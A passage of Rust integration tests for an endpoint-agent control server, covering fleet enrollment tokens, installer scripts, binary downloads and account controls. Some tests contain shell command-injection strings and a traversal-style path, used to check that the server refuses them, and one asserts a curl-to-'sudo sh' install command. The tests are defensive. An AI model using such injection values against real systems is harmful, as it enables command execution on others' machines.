    let (status, _) = remote.submit(&outside, b"no receipt").await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a proof reaches the server too, and this one is refused for what it is");
}

#[tokio::test]
async fn test_console_is_served_with_spa_fallback_and_unknown_api_paths_404() {
    set_test_env();
    let dist = std::env::temp_dir().join(format!("zedr-console-{}", std::process::id()));
    std::fs::create_dir_all(dist.join("assets")).unwrap();
    std::fs::write(dist.join("index.html"), "<html>console</html>").unwrap();
    std::fs::write(dist.join("assets/app.js"), "console.log(1)").unwrap();

    let options = zedr_control_server::api::RouterOptions {
        operator_allowlist: Vec::new(),
        frontend_dist: Some(dist.clone()),
        receipt_verifier: None,
    };
    let app = zedr_control_server::api::create_router_with_options(create_test_db().await, options);

    let fetch = |uri: &'static str| {
        let app = app.clone();
        async move {
            let response = app.oneshot(Request::builder().uri(uri).body(Body::empty()).unwrap()).await.unwrap();
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
            (status, String::from_utf8_lossy(&bytes).to_string())
        }
    };

    assert_eq!(fetch("/").await, (StatusCode::OK, "<html>console</html>".to_string()));
    assert_eq!(fetch("/assets/app.js").await, (StatusCode::OK, "console.log(1)".to_string()));
    assert_eq!(fetch("/admin/agents").await, (StatusCode::OK, "<html>console</html>".to_string()));
    assert_eq!(fetch("/api/does-not-exist").await.0, StatusCode::NOT_FOUND);
    assert_eq!(fetch("/api/admin/agents").await.0, StatusCode::UNAUTHORIZED);

    std::fs::remove_dir_all(&dist).unwrap();
}

struct IssuedFleetToken {
    id: String,
    token: String,
}

async fn create_fleet_token(app: &axum::Router, label: &str, max_uses: Option<i64>) -> IssuedFleetToken {
    let (status, json) = call(
        app,
        "POST",
        "/api/admin/enrollment-tokens",
        Some(&admin_token("admin")),
        Some(serde_json::json!({ "label": label, "expires_in_days": 30, "max_uses": max_uses })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "fleet token {} must be created", label);

    IssuedFleetToken {
        id: json["id"].as_str().unwrap().to_string(),
        token: json["token"].as_str().unwrap().to_string(),
    }
}

async fn register_with(app: &axum::Router, agent: &mut TestAgent, enrollment_key: Option<&str>) -> StatusCode {
    let body = agent.registration(enrollment_key);
    send_signed(app, agent, "/api/agents/register", body).await.0
}

async fn fleet_token_use_count(pool: &SqlitePool, id: &str) -> i64 {
    sqlx::query_scalar("SELECT use_count FROM enrollment_tokens WHERE id = ?")
        .bind(id)
        .fetch_one(pool)
        .await
        .unwrap()
}

async fn rejections(pool: &SqlitePool) -> Vec<serde_json::Value> {
    sqlx::query_scalar::<_, String>("SELECT data FROM events WHERE event_type = 'enrollment_rejected' ORDER BY rowid")
        .fetch_all(pool)
        .await
        .unwrap()
        .iter()
        .map(|data| serde_json::from_str(data).unwrap())
        .collect()
}

async fn get_with_enrollment_key(app: &axum::Router, uri: &str, key: Option<&str>) -> (StatusCode, Vec<u8>) {
    let mut request = Request::builder().uri(uri);
    if let Some(key) = key {
        request = request.header(zedr_control_server::enrollment::KEY_HEADER, key);
    }
    let response = app.clone().oneshot(request.body(Body::empty()).unwrap()).await.unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, bytes.to_vec())
}

#[tokio::test]
async fn test_one_fleet_token_enrolls_many_agents_into_its_group() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "prod-web", None).await;

    for id in ["asg-node-1", "asg-node-2", "asg-node-3"] {
        let mut agent = TestAgent::new(id);
        assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK, "{} must enroll", id);

        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "{} must heartbeat with its own key", id);
    }

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 3);

    let (status, json) = call(&app, "GET", "/api/admin/agents", Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    let agents = json["agents"].as_array().unwrap();
    assert_eq!(agents.len(), 3);
    assert!(agents.iter().all(|agent| agent["enrollment_group"] == "prod-web" && agent["enrollment_token_id"] == fleet.id.as_str()));

    let (_, json) = call(&app, "GET", "/api/admin/enrollment-tokens", Some(&admin_token("user")), None).await;
    let listed = &json["tokens"][0];
    assert_eq!(listed["label"], "prod-web");
    assert_eq!(listed["use_count"], 3);
    assert!(listed["last_used_at"].as_i64().unwrap() > 0);
    assert!(listed["revoked_at"].is_null());
}

#[tokio::test]
async fn test_fleet_token_is_shown_once_and_stored_as_a_hash() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "hashed", None).await;

    assert!(fleet.token.starts_with("zedr_fleet_"));
    assert_eq!(fleet.token.len(), "zedr_fleet_".len() + 64);

    let (_, json) = call(&app, "GET", "/api/admin/enrollment-tokens", Some(&admin_token("admin")), None).await;
    assert!(!json.to_string().contains(&fleet.token));

    let rows: Vec<String> = sqlx::query_scalar(
        "SELECT id || token_hash || label || created_by FROM enrollment_tokens"
    ).fetch_all(&pool).await.unwrap();
    assert_eq!(rows.len(), 1);
    assert!(rows.iter().all(|row| !row.contains(&fleet.token)));

    let audit: Vec<String> = sqlx::query_scalar("SELECT detail FROM audit_log").fetch_all(&pool).await.unwrap();
    assert!(audit.iter().all(|detail| !detail.contains(&fleet.token)));
}

#[tokio::test]
async fn test_revoked_fleet_token_stops_new_enrollments_and_keeps_enrolled_agents() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "revocable", None).await;

    let mut enrolled = TestAgent::new("enrolled-before-revocation");
    assert_eq!(register_with(&app, &mut enrolled, Some(&fleet.token)).await, StatusCode::OK);

    let (status, json) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", fleet.id), Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(json["revoked_at"].as_i64().unwrap() > 0);
    assert_eq!(json["revoked_by"], "tester");

    let mut late = TestAgent::new("launched-after-revocation");
    assert_eq!(register_with(&app, &mut late, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 1);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected.len(), 1);
    assert_eq!(rejected[0]["reason"], "revoked");
    assert_eq!(rejected[0]["enrollment_token_id"], fleet.id.as_str());
    assert_eq!(rejected[0]["enrollment_group"], "revocable");
    assert_eq!(rejected[0]["claimed_agent_id"], "launched-after-revocation");

    let body = enrolled.heartbeat();
    let (status, _) = send_signed(&app, &enrolled, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK, "revocation does not touch agents that already enrolled");

    enrolled.restart();
    assert_eq!(register_with(&app, &mut enrolled, Some(&fleet.token)).await, StatusCode::OK, "a pinned key outlives the token");
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1);
}

#[tokio::test]
async fn test_expired_fleet_token_cannot_enroll() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "short-lived", None).await;
    sqlx::query("UPDATE enrollment_tokens SET expires_at = ? WHERE id = ?")
        .bind(chrono::Utc::now().timestamp() - 1)
        .bind(&fleet.id)
        .execute(&pool)
        .await
        .unwrap();

    let mut agent = TestAgent::new("too-late");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);
    assert_eq!(rejections(&pool).await[0]["reason"], "expired");
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 0);
}

#[tokio::test]
async fn test_fleet_token_use_cap_is_enforced() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "capped", Some(2)).await;

    for id in ["capped-1", "capped-2"] {
        let mut agent = TestAgent::new(id);
        assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    }

    let mut third = TestAgent::new("capped-3");
    assert_eq!(register_with(&app, &mut third, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED);

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 2);
    assert_eq!(rejections(&pool).await[0]["reason"], "exhausted");
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 2);
}

#[tokio::test]
async fn test_concurrent_fleet_enrollments_never_exceed_the_use_cap() {
    set_test_env();
    let database = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join(format!("fleet-race-{}.db", uuid::Uuid::new_v4()));
    let pool = SqlitePoolOptions::new()
        .max_connections(8)
        .connect(&format!("sqlite://{}?mode=rwc", database.display()))
        .await
        .unwrap();
    sqlx::migrate!("./migrations").run(&pool).await.unwrap();
    seed_test_accounts(&pool).await;
    let app = zedr_control_server::api::create_router(pool.clone());
    let fleet = create_fleet_token(&app, "raced", Some(3)).await;

    let attempts = (0..12).map(|index| {
        let app = app.clone();
        let token = fleet.token.clone();
        tokio::spawn(async move {
            let mut agent = TestAgent::new(&format!("raced-{}", index));
            register_with(&app, &mut agent, Some(&token)).await
        })
    });
    let outcomes: Vec<StatusCode> = futures::future::join_all(attempts).await.into_iter().map(|outcome| outcome.unwrap()).collect();

    assert_eq!(outcomes.iter().filter(|status| **status == StatusCode::OK).count(), 3);
    assert_eq!(outcomes.iter().filter(|status| **status == StatusCode::UNAUTHORIZED).count(), 9);
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 3);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 3);

    pool.close().await;
    for suffix in ["", "-wal", "-shm"] {
        let _ = std::fs::remove_file(format!("{}{}", database.display(), suffix));
    }
}

#[tokio::test]
async fn test_fleet_token_cannot_replace_the_key_of_an_enrolled_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "no-takeover", None).await;

    let mut by_install_key = enroll(&app, &pool, "pet-server").await;
    let mut by_fleet_token = TestAgent::new("cattle-node");
    assert_eq!(register_with(&app, &mut by_fleet_token, Some(&fleet.token)).await, StatusCode::OK);

    for victim in ["pet-server", "cattle-node"] {
        let mut impostor = TestAgent::new(victim);
        assert_eq!(register_with(&app, &mut impostor, Some(&fleet.token)).await, StatusCode::UNAUTHORIZED, "{} must not be taken over", victim);

        assert_eq!(open_incidents(&pool, victim).await, vec!["identity_conflict"]);
        let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = ? AND incident_type = 'identity_conflict'")
            .bind(victim)
            .fetch_one(&pool)
            .await
            .unwrap();
        let evidence: serde_json::Value = serde_json::from_str(&evidence).unwrap();
        assert_eq!(evidence["enrollment_token_id"], fleet.id.as_str());
        assert_eq!(evidence["enrollment_group"], "no-takeover");

        let body = impostor.heartbeat();
        let (status, _) = send_signed(&app, &impostor, "/api/events", body).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "the impostor key is not pinned to {}", victim);
    }

    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1, "refused takeovers spend no uses");

    for (agent, id) in [(&mut by_install_key, "pet-server"), (&mut by_fleet_token, "cattle-node")] {
        let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = ?").bind(id).fetch_one(&pool).await.unwrap();
        assert_eq!(pinned, Some(agent.public_key()));
        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "{} keeps reporting with its own key", id);
    }
}

#[tokio::test]
async fn test_enrolled_agent_presenting_its_fleet_token_again_spends_no_use() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "rerun", Some(1)).await;

    let mut agent = TestAgent::new("installer-ran-twice");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);

    agent.restart();
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 1);
    assert!(rejections(&pool).await.is_empty());
}

#[tokio::test]
async fn test_single_use_key_still_replaces_the_identity_of_a_fleet_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "rebuilt", None).await;

    let mut original = TestAgent::new("rebuilt-node");
    assert_eq!(register_with(&app, &mut original, Some(&fleet.token)).await, StatusCode::OK);

    insert_install_key(&pool, "zedr_rebuild_key", 3600).await;
    let mut rebuilt = TestAgent::new("rebuilt-node");
    assert_eq!(register_with(&app, &mut rebuilt, Some("zedr_rebuild_key")).await, StatusCode::OK);

    let (token_id, pinned): (Option<String>, Option<String>) =
        sqlx::query_as("SELECT enrollment_token_id, public_key FROM agents WHERE id = 'rebuilt-node'").fetch_one(&pool).await.unwrap();
    assert_eq!(token_id, None);
    assert_eq!(pinned, Some(rebuilt.public_key()));
}

#[tokio::test]
async fn test_unknown_fleet_token_is_rejected_and_recorded() {
    let (app, pool) = create_test_app_with_pool().await;

    let mut agent = TestAgent::new("guessing");
    let guess = format!("zedr_fleet_{}", "0".repeat(64));
    assert_eq!(register_with(&app, &mut agent, Some(&guess)).await, StatusCode::UNAUTHORIZED);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected[0]["reason"], "unknown");
    assert!(rejected[0]["enrollment_token_id"].is_null());
    assert!(!rejected[0].to_string().contains(&guess));
}

#[tokio::test]
async fn test_enrollment_token_management_needs_an_admin_and_is_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");
    let user = admin_token("user");
    let request = serde_json::json!({ "label": "managed", "expires_in_days": 7 });

    let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", None, Some(request.clone())).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "GET", "/api/admin/enrollment-tokens", None, None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&user), Some(request.clone())).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    for invalid in [
        serde_json::json!({ "label": "bad label", "expires_in_days": 7 }),
        serde_json::json!({ "label": "", "expires_in_days": 7 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 0 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 366 }),
        serde_json::json!({ "label": "managed", "expires_in_days": 7, "max_uses": 0 }),
    ] {
        let (status, _) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&admin), Some(invalid.clone())).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{} must be refused", invalid);
    }

    let (status, created) = call(&app, "POST", "/api/admin/enrollment-tokens", Some(&admin), Some(request)).await;
    assert_eq!(status, StatusCode::OK);
    let id = created["id"].as_str().unwrap();
    let token = created["token"].as_str().unwrap();
    let lifetime = created["expires_at"].as_i64().unwrap() - chrono::Utc::now().timestamp();
    assert!((7 * 86400 - 5..=7 * 86400).contains(&lifetime));
    assert_eq!(
        created["linux_command"],
        format!("curl -fsSL -H 'X-Zedr-Enrollment-Key: {}' {}/install.sh | sudo sh", token, TEST_SERVER_URL)
    );
    assert_eq!(created["windows_command"], format!("iwr -useb {}/install.ps1?key={} | iex", TEST_SERVER_URL, token));

    let (status, _) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&user), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let (status, _) = call(&app, "DELETE", "/api/admin/enrollment-tokens/no-such-token", Some(&admin), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    let (status, first) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, second) = call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", id), Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(first["revoked_at"], second["revoked_at"], "revoking twice keeps the first revocation");

    let actions: Vec<String> = sqlx::query_scalar("SELECT action FROM audit_log ORDER BY seq").fetch_all(&pool).await.unwrap();
    assert_eq!(actions, vec!["enrollment_token.create", "enrollment_token.revoke"]);
    assert_eq!(zedr_control_server::audit::first_broken_entry(&pool).await.unwrap(), None);
}

#[tokio::test]
async fn test_unix_installer_without_a_key_holds_no_secret_and_is_valid_shell() {
    let app = create_test_app().await;

    let (status, script) = get_with_enrollment_key(&app, "/install.sh", None).await;
    assert_eq!(status, StatusCode::OK);
    let script = String::from_utf8(script).unwrap();

    assert!(script.starts_with("#!/bin/sh\n"));
    assert!(script.contains(&format!("CONTROL_SERVER_URL=\"{}\"", TEST_SERVER_URL)));
    assert!(script.contains("ENROLLMENT_KEY=\"\"\n"));
    assert!(script.contains("ZEDR_ENROLLMENT_KEY"));
    assert!(!script.contains("__ZEDR_"));
    assert!(script.trim_end().ends_with("main \"$@\""), "a truncated download must not run anything");

    let path = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("install-without-key.sh");
    std::fs::write(&path, &script).unwrap();
    let syntax = std::process::Command::new("sh").arg("-n").arg(&path).output().unwrap();
    assert!(syntax.status.success(), "sh -n: {}", String::from_utf8_lossy(&syntax.stderr));
}

#[tokio::test]
async fn test_unix_installer_embeds_only_a_usable_credential() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "scripted", None).await;
    insert_install_key(&pool, "zedr_scripted_install_key", 3600).await;

    let (status, script) = get_with_enrollment_key(&app, "/install.sh", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains(&format!("ENROLLMENT_KEY=\"{}\"\n", fleet.token)));

    let (status, script) = get_with_enrollment_key(&app, "/install.sh?key=zedr_scripted_install_key", None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains("ENROLLMENT_KEY=\"zedr_scripted_install_key\"\n"));

    let (status, script) = get_with_enrollment_key(&app, &format!("/install.ps1?key={}", fleet.token), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(String::from_utf8(script).unwrap().contains(&format!("$InstallKey = \"{}\"", fleet.token)));

    for refused in ["zedr_fleet_never_issued", "zedr_never_issued", "$(id)", "x\"; id; \""] {
        let (status, body) = get_with_enrollment_key(&app, "/install.sh", Some(refused)).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{:?} must not yield a script", refused);
        assert!(!String::from_utf8_lossy(&body).contains("#!/bin/sh"));
    }

    call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", fleet.id), Some(&admin_token("admin")), None).await;
    let (status, _) = get_with_enrollment_key(&app, "/install.sh", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = get_with_enrollment_key(&app, "/install.ps1", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = get_with_enrollment_key(&app, "/install.ps1", None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_prover_is_served_with_the_agent_and_only_to_a_usable_credential() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_prover_install_key", 3600).await;
    let prover = "/api/installers/binaries/linux-x64/prover";

    let (status, _) = get_with_enrollment_key(&app, prover, None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, body) = get_with_enrollment_key(&app, prover, Some("zedr_never_issued")).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert!(!body.windows(TEST_PROVER.len()).any(|window| window == TEST_PROVER));

    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/windows-arm64/prover", Some("zedr_prover_install_key")).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "a platform no prover was built for says so, and the installer goes on without one");
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/..-x64/prover", Some("zedr_prover_install_key")).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    for _ in 0..2 {
        let (status, body) = get_with_enrollment_key(&app, prover, Some("zedr_prover_install_key")).await;
        assert_eq!(status, StatusCode::OK, "the prover does not use up the install key, the agent that follows it does");
        assert_eq!(body, TEST_PROVER, "the prover is served as built, nothing is patched into it");
    }

    let (status, _) = download_agent(&app, "linux-x64", "zedr_prover_install_key").await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = get_with_enrollment_key(&app, prover, Some("zedr_prover_install_key")).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a used install key downloads nothing more");

    let fleet = create_fleet_token(&app, "provers", None).await;
    let (status, body) = get_with_enrollment_key(&app, prover, Some(&fleet.token)).await;
    assert_eq!((status, body.as_slice()), (StatusCode::OK, TEST_PROVER));
    call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", fleet.id), Some(&admin_token("admin")), None).await;
    let (status, _) = get_with_enrollment_key(&app, prover, Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_fleet_token_downloads_the_agent_for_every_machine_until_revoked() {
    let (app, pool) = create_test_app_with_pool().await;
    let fleet = create_fleet_token(&app, "downloads", Some(1)).await;

    for _ in 0..3 {
        let (status, binary) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&fleet.token)).await;
        assert_eq!(status, StatusCode::OK);
        let (contents, signature) = binary.split_at(binary.len() - 64);
        let signature = ed25519_dalek::Signature::from_slice(signature).unwrap();
        assert!(test_deployment_key().verify(contents, &signature).is_ok());
    }
    assert_eq!(fleet_token_use_count(&pool, &fleet.id).await, 0, "downloads are not enrollments");

    let recorded: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE event_type = 'install' AND agent_id IS NULL")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(recorded.len(), 3);
    assert!(recorded.iter().all(|data| data.contains(&fleet.id) && data.contains("downloads") && !data.contains(&fleet.token)));

    let (status, _) = download_agent(&app, "linux-x64", &fleet.token).await;
    assert_eq!(status, StatusCode::OK, "the query parameter still carries a credential");

    let mut agent = TestAgent::new("last-seat");
    assert_eq!(register_with(&app, &mut agent, Some(&fleet.token)).await, StatusCode::OK);
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&fleet.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "an exhausted token serves nothing");

    let unlimited = create_fleet_token(&app, "downloads", None).await;
    call(&app, "DELETE", &format!("/api/admin/enrollment-tokens/{}", unlimited.id), Some(&admin_token("admin")), None).await;
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&unlimited.token)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rejected = rejections(&pool).await;
    assert_eq!(rejected.len(), 2, "a fleet that can no longer download its agent is visible in the event stream");
    assert_eq!(rejected[0]["stage"], "download");
    assert_eq!(rejected[0]["reason"], "exhausted");
    assert_eq!(rejected[0]["enrollment_token_id"], fleet.id.as_str());
    assert_eq!(rejected[1]["reason"], "revoked");
    assert_eq!(rejected[1]["enrollment_token_id"], unlimited.id.as_str());
    assert_eq!(rejected[1]["platform"], "linux-x64");

    let guess = format!("zedr_fleet_{}", "f".repeat(64));
    let (status, _) = get_with_enrollment_key(&app, "/api/installers/binaries/linux-x64", Some(&guess)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(rejections(&pool).await.len(), 2, "guessed tokens leave no events");
}

const ACCOUNT_PASSWORD: &str = "Correct-Horse-9";

async fn sign_in(app: &axum::Router, username: &str, password: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": username, "password": password }))).await
}

async fn session_of(app: &axum::Router, username: &str) -> String {
    let (status, login) = sign_in(app, username, ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK);
    login["token"].as_str().unwrap().to_string()
}

async fn audit_actions(pool: &SqlitePool) -> Vec<String> {
    sqlx::query_scalar("SELECT action FROM audit_log ORDER BY seq").fetch_all(pool).await.unwrap()
}

#[tokio::test]
async fn test_a_deleted_account_loses_access_at_once() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-gone", "leaver", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "leaver").await;
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::OK);

    let (status, _) = call(&app, "DELETE", "/api/admin/users/u-gone", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    for stream in ["events", "agents"] {
        let (status, _) = call(&app, "GET", &format!("/api/admin/{}/stream?token={}", stream, session), None, None).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "the {} stream refuses the old session", stream);
    }
}

#[tokio::test]
async fn test_a_disabled_account_cannot_use_its_session_its_api_key_or_its_password() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-off", "suspended", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "suspended").await;
    let (status, key) = call(&app, "POST", "/api/admin/api-keys", Some(&session), Some(serde_json::json!({ "name": "ci" }))).await;
    assert!(status.is_success());
    let api_key = key["api_key"].as_str().unwrap().to_string();
    let with_api_key = || Request::builder().uri("/api/admin/agents").header("x-api-key", &api_key).body(Body::empty()).unwrap();
    assert_eq!(app.clone().oneshot(with_api_key()).await.unwrap().status(), StatusCode::OK);

    let admin = admin_token("admin");
    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-off", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;
    assert_eq!(status, StatusCode::OK);
    assert!(account["disabled_at"].is_i64());

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(app.clone().oneshot(with_api_key()).await.unwrap().status(), StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "suspended", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-off", Some(&admin), Some(serde_json::json!({ "disabled": false }))).await;
    assert_eq!(status, StatusCode::OK);
    assert!(account["disabled_at"].is_null());
    let (status, _) = sign_in(&app, "suspended", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK);

    let actions = audit_actions(&pool).await;
    assert!(actions.contains(&"user.disable".to_string()) && actions.contains(&"user.enable".to_string()));
}

#[tokio::test]
async fn test_a_role_change_applies_to_sessions_that_are_already_open() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-role", "demoted", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "demoted").await;
    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert!(status.is_success());

    let admin = admin_token("admin");
    let change = serde_json::json!({ "role": "user" });
    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-role", Some(&admin), Some(change.clone())).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(account["role"], "user");

    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "the open session is read-only from the next request");
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::OK);

    call(&app, "PATCH", "/api/admin/users/u-role", Some(&admin), Some(change)).await;
    let detail: Vec<String> = sqlx::query_scalar("SELECT detail FROM audit_log WHERE action = 'user.role_change'").fetch_all(&pool).await.unwrap();
    assert_eq!(detail.len(), 1, "repeating the same role writes no second entry");
    assert!(detail[0].contains("\"from\":\"admin\"") && detail[0].contains("\"to\":\"user\""));
}

#[tokio::test]
async fn test_sign_out_everywhere_and_a_password_reset_end_open_sessions() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-out", "roamer", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");

    let first = session_of(&app, "roamer").await;
    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/sign-out", Some(&admin), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&first), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let second = session_of(&app, "roamer").await;
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&second), None).await;
    assert_eq!(status, StatusCode::OK, "a new sign-in works after signing out everywhere");

    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/password", Some(&admin), Some(serde_json::json!({ "password": "short" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/password", Some(&admin), Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&second), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "roamer", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "roamer", "New-Horse-Battery-7").await;
    assert_eq!(status, StatusCode::OK);

    let actions = audit_actions(&pool).await;
